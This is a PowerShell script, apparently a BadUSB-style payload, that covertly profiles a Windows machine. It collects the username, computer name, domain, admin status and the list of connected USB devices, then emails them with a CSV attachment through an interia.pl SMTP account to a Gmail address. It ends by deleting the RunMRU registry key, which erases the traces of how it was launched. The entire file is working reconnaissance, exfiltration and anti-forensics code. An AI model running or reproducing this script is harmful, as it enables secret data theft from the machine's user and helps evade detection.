$SmtpServer = "poczta.interia.pl" ; $SmtpPort = "587"
$secpasswd = ConvertTo-SecureString $Password -AsPlainText -Force
$user = $u + "@interia.pl"
$cred = New-Object System.Management.Automation.PSCredential ($user, $secpasswd)
$Subject = "Computer check"
$To = $T + "@gmail.com"

$name = $env:UserName
$computername = $env:ComputerName
$domain = $env:USERDOMAIN
$admin = "No admin"

function is_admin{
Param($a)
$t = Get-LocalGroupMember -Group $a | Select-Object Name
$t.Name -ccontains "$env:ComputerName\$env:UserName"}
if ($computername -eq $domain) {
if ($PSUICulture -eq "pl-PL"){
if (is_admin -a 'Administratorzy'-eq $true){
$admin = "Is admin"}}
else {
if (is_admin -a 'Administrators'-eq $true){
$admin = "Is admin"}}}
else{
$admin = "Domain user"}

$u = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }
$F2 = "$env:USERNAME-USB.csv"
$u | Export-Csv -Path "$env:tmp/$F2" -NoTypeInformation
$Body = "<h3>Username: 3333<br>ComputerName: ::<br>Domain: ww<br>Admin: xx</h3>" -replace "3333",$name  -replace "::",$computername -replace "ww",$domain -replace "xx",$admin

$Report = @("$env:tmp\$F2")

Send-MailMessage -From $user -to $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -port $SMTPPort -Credential $cred -UseSsl -BodyAsHtml -Attachments $Report
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
